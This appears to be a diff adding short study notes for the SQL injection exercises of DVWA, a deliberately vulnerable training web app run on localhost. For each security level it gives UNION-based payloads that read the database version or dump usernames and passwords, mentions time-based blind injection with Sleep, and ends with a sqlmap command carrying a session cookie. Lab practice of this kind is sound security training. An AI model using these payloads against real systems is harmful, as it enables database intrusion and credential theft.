@@ -1,0 +1,19 @@
+Low 
+    1' UNION SELECT @@VERSION,NULL#
+    Run a script to get correct version
+
+Medium
+    Change one of the option values to 
+        1 UNION SELECT @@VERSION,NULL#
+    (as it does not have quotes)
+
+High
+    ' union select user,password from users#
+    In the tab that opens up
+
+
+Use in combination with Sleep to get truthhood
+
+Or We Can use SQLMap for all of them
+
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=njos0jhhcj197l8dj3d9bs08co; security=low"
